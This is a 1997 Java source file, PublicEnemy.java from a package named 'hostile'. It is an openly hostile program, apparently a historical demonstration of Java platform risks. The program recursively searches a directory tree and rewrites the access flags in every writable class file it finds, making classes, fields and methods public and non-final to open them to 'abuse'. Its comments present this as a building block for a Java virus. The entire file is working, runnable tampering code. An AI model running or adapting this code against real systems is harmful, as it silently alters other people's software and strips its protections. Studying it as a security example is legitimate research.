package hostile;
/* PublicEnemy.java by Mark D. LaDue */

/* January 13, 1997 */

/* Copyright (c) 1997 Mark D. LaDue
   You may study, use, modify, and distribute this example for any purpose.
   This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java application directly attacks Java class files.  Given a
   target directory, it searches that directory and all subdirectories for
   Java class files.  Once a class file is located, PublicEnemy alters the
   contents of its "access_flags" for the class, its fields, and its methods.
   The results are the following:

   1. The class becomes public.
   2. Any "static" or "volatile" fields remain as such; "final" fields
      become "non-final"; "transient" fields become "non-transient;" and
      "private" or "protected" fields become "public," while "public"
      fields remain so.
   3. Any "abstract, "native," "synchronized," or "static" methods remain
      as such; "final" methods become "non-final;" and "private" or
      "protected" methods become "public," while "public" methods remain so.

   This should open the class to the maximum amount of inspection and abuse
   without directly affecting its ability to run.  Note that the size of the
   resulting class is the same as the original. The ability to modify Java
   class files on the fly is just the skill that a Java Platform Virus will
   require.  The fact that it's this easy bodes ill....*/

import java.io.*;

class PublicEnemy {
    public static void main (String[] argv) {
// Start at the current directory or one given on the command line
        String homedir = System.getProperty("user.dir");
        if(argv.length == 1) {homedir = argv[0];}
        File present = new File(homedir);
        int ind;
        String[] dirlist;
// List the contents of the given directory and consider each entry
        for (dirlist = present.list(), ind = 0;
             dirlist != null && ind < dirlist.length; ind++){
            File entry = new File(dirlist[ind]);
            File entrypath = new File(present, dirlist[ind]);
// If the entry is a writeable class file, go ahead and attack it, but
// don't mess with PublicEnemy
            if ((entrypath.isFile()) && (entrypath.canWrite()) &&
                (entry.toString().endsWith(".class")) &&
                 !(entry.toString().equals("PublicEnemy.class"))) {
                int fpointer = 8; // Where are we in the class file?
                int cp_entries = 1; // How big is the constant pool?
                int num_interfaces = 0; // How many interfaces does it use?
                int num_fields = 0; // How many fields are there?
                int num_f_attributes = 0; // How many attributes has a field?
                int num_methods = 0; // How many methods are there?
                int num_m_attributes = 0; // How many attributes has a method?
                try {
// Skip the magic number and versions and start looking at the class file
                    RandomAccessFile victim = new RandomAccessFile(entrypath,
                                                                   "rw");
                    victim.seek(fpointer);
// Determine how many entries there are in the constant pool
                    cp_entries = victim.readUnsignedShort();
                    fpointer += 2;
// Look at each entry in the constant pool and advance to the next one
// according to its size
                    for (int i = 1; i < cp_entries; i++) {
                        int tag = victim.readUnsignedByte();
                        fpointer++;
                        int skipper = 0;
                        switch (tag) {
                            case 7:
                            case 8: fpointer = fpointer + 2;
                                    break;
                            case 3:
                            case 4:
                            case 9:
                            case 10:
                            case 11:
                            case 12: fpointer = fpointer + 4;
                                     break;
                            case 5:
                            case 6: fpointer = fpointer +8;
                                    i++;
                                    break;
                            case 1: skipper = victim.readUnsignedShort();
                                    fpointer = fpointer + skipper + 2;
                                    break;
                        }
                        victim.seek(fpointer); 
                    }
// Make the class itself public
                    victim.writeShort(1);
// Skip ahead and see how many interfaces the class implements
                    fpointer += 6;
                    victim.seek(fpointer);
                    num_interfaces = victim.readUnsignedShort();
// Bypass the interface information and determine the number of fields
                    fpointer = fpointer + 2*(num_interfaces) + 2;
                    victim.seek(fpointer);
                    num_fields = victim.readUnsignedShort();
                    fpointer += 2;
                    victim.seek(fpointer);
// Look at each field, determine what's in it, and modify it as desired
                    for (int j=0; j<num_fields; j++) {
                        int flag = victim.readUnsignedShort();
                        victim.seek(fpointer);
                        int coeff_tra = flag/128;
                        int diff1 = flag - 128*coeff_tra;
                        int coeff_vol = diff1/64;
                        int diff2 = diff1 - 64*coeff_vol;
                        int coeff_fin = diff2/16;
                        int diff3 = diff2 - 16*coeff_fin;
                        int coeff_sta = diff3/8;
                        flag = 64*coeff_vol + 8*coeff_sta + 1;
// Leave only "static" and "volatile" fields as such, eliminate "transient"
// and "final," and convert "protected" and "private" to "public."
                        victim.writeShort(flag);
// Skip ahead to the attributes and see how far to go to the next field
                        fpointer += 6;
                        victim.seek(fpointer);
                        num_f_attributes = victim.readUnsignedShort();
                        fpointer = fpointer + 8*(num_f_attributes) + 2;
                        victim.seek(fpointer);
                    }
// Determine the number of methods
                    num_methods = victim.readUnsignedShort();
                    fpointer += 2;
// Examine each method and modify it as desired
                    for (int k=0; k<num_methods; k++) {
                        int flag = victim.readUnsignedShort();
                        victim.seek(fpointer);
                        int coeff_abs = flag/1024;
                        int diff1 = flag - 1024*coeff_abs;
                        int coeff_nat = diff1/256;
                        int diff2 = diff1 - 256*coeff_nat;
                        int coeff_syn = diff2/32;
                        int diff3 = diff2 - 32*coeff_syn;
                        int coeff_fin = diff3/16;
                        int diff4 = diff3 - 16*coeff_fin;
                        int coeff_sta = diff4/8;
                        flag = 1024*coeff_abs + 256*coeff_nat + 32*coeff_syn
                               + 8*coeff_sta + 1;
// Leave "abtract," "native," "synchronized," and "static" methods as such,
// but get rid of "final" and change "private" and "protected" to "public."
                        victim.writeShort(flag);
// Skip ahead to the attributes and see how far to go to the next method
                        fpointer += 6;
                        victim.seek(fpointer);
                        num_m_attributes = victim.readUnsignedShort();
                        fpointer += 2;
                        for (int m=0; m<num_m_attributes; m++) {
                            fpointer += 2;
                            victim.seek(fpointer);
                            fpointer = fpointer + victim.readInt() + 4;
                            victim.seek(fpointer);
                        }
                    }
// All the changes are made, so close the file and move along
                    victim.close();
                } catch (IOException ioe) {}
            }
// If the entry of the directory listing is a readable directory, then
// attack its class files
            if ((entrypath.isDirectory()) && (entrypath.canRead())) {
                String[] argvone = {entrypath.getAbsolutePath()};
                PublicEnemy.main(argvone);
            }
        }
    }
}
